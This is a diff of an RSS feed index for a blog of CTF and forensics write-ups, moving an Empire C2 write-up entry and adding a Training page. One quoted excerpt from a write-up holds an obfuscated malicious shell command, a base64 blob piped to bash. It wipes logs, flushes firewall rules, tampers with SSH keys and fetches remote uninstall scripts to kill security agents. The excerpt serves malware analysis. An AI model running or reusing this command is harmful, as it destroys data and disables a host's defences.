@@ -105,13 +105,6 @@ I just happened to be reading something about Blackeye tool, so we&amp;rsquo;ll 
 &lt;p&gt;Its very quick and easy to set up blackeye. All you have to do is the following:&lt;/p&gt;</description>
     </item>
     <item>
-      <title></title>
-      <link>http://localhost:1313/training/empirec2/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/training/empirec2/</guid>
-      <description></description>
-    </item>
-    <item>
       <title>About</title>
       <link>http://localhost:1313/about/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -224,6 +217,13 @@ Therefore, the initial approach is to utilize search engines, such as Google, to
 &lt;/p&gt;
 &lt;p&gt;Upon conducting a search, we discover several posts that appear to be relevant to the challenge and could potentially guide us towards a solution.&lt;br&gt;
 Of particular interest is the first post, which features a script that bears a striking resemblance to our own:&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Empire C2 - Writeup</title>
+      <link>http://localhost:1313/ctfwriteups/empire/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ctfwriteups/empire/</guid>
+      <description>&lt;p&gt;In this challenge we are given a pcap file and a powershell dump.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Exploring OneNote Forensic tools</title>
@@ -643,6 +643,13 @@ For this purpose, we can use the online tool:&lt;/p&gt;</description>
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo -n &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;IyEvYmluL3NoDQp1bGltaXQgLW4gNjU1MzUNCnN1ZG8gcmVib290DQpybSAtcmYgL3Zhci9sb2cvc3lzbG9nDQpjaGF0dHIgLWl1YSAvdG1wLw0KY2hhdHRyIC1pdWEgL3Zhci90bXAvDQpjaGF0dHIgLVIgLWkgL3Zhci9zcG9vbC9jcm9uDQpjaGF0dHIgLWkgL2V0Yy9jcm9udGFiDQp1ZncgZGlzYWJsZQ0KaXB0YWJsZXMgLUYNCmVjaG8gIlExUkdURWxDZTIwMGJERmpNVEIxTlY4MWVUVTNNMjFmZFhCa05EY3pOWDA9IiA+IC90bXAvbG9nX3JvdA0Kc3VkbyBzeXNjdGwga2VybmVsLm5taV93YXRjaGRvZz0wDQplY2hvICcwJyA+IC9wcm9jL3N5cy9rZXJuZWwvbm1pX3dhdGNoZG9nDQplY2hvICdrZXJuZWwubm1pX3dhdGNoZG9nPTAnID4+IC9ldGMvc3lzY3RsLmNvbmYNCnVzZXJkZWwga2V5DQp1c2VyZGVsIHZmaW5kZXINCmNoYXR0ciAtaWFlIC9yb290Ly5zc2gvDQpjaGF0dHIgLWlhZSAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cw0Kcm0gLXJmIC90bXAvYWRkcmVzKg0Kcm0gLXJmIC90bXAvd2FsbGUqDQpybSAtcmYgL3RtcC9rZXlzDQppZiBwcyBhdXggfCBncmVwIC1pICdbYV1saXl1bic7IHRoZW4NCgljdXJsIGh4eHA6Ly91cGRhdGUuYWVnaXMuYWxpeXVuLmNvbS9kb3dubG9hZC91bmluc3RhbGwuc2ggfCBiYXNoDQoJY3VybCBoeHhwOi8vdXBkYXRlLmFlZ2lzLmFsaXl1bi5jb20vZG93bmxvYWQvcXVhcnR6X3VuaW5zdGFsbC5zaCB8IGJhc2gJDQoJcGtpbGwgYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL2V0Yy9pbml0LmQvYWdlbnR3YXRjaCAvdXNyL3NiaW4vYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL3Vzci9sb2NhbC9hZWdpcyoNCglzeXN0ZW1jdGwgc3RvcCBhbGl5dW4uc2VydmljZQ0KCXN5c3RlbWN0bCBkaXNhYmxlIGFsaXl1bi5zZXJ2aWNlDQoJc2VydmljZSBiY20tYWdlbnQgc3RvcA0KCXl1bSByZW1vdmUgYmNtLWFnZW50IC15DQoJYXB0LWdldCByZW1vdmUgYmNtLWFnZW50IC15DQplbGlmIHBzIGF1eCB8IGdyZXAgLWkgJ1t5XXVuamluZyc7IHRoZW4NCgkvdXNyL2xvY2FsL2djbG91ZC9zdGFyZ2F0ZS9hZG1pbi91bmluc3RhbGwuc2g=&amp;#34;&lt;/span&gt; | base64 -d | bash -s
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We see the script decodes a b64 string and then runs it by piping it to bash.&lt;br&gt;
 Let&amp;rsquo;s follow up with the script and decode it ourselves. We can do that using an online base64 decoder and passing the base64 string to it. By doing so, we will end up with the following:&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Training</title>
+      <link>http://localhost:1313/training/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/training/</guid>
+      <description>training</description>
     </item>
     <item>
       <title>Upgrading Windows - Writeup</title>
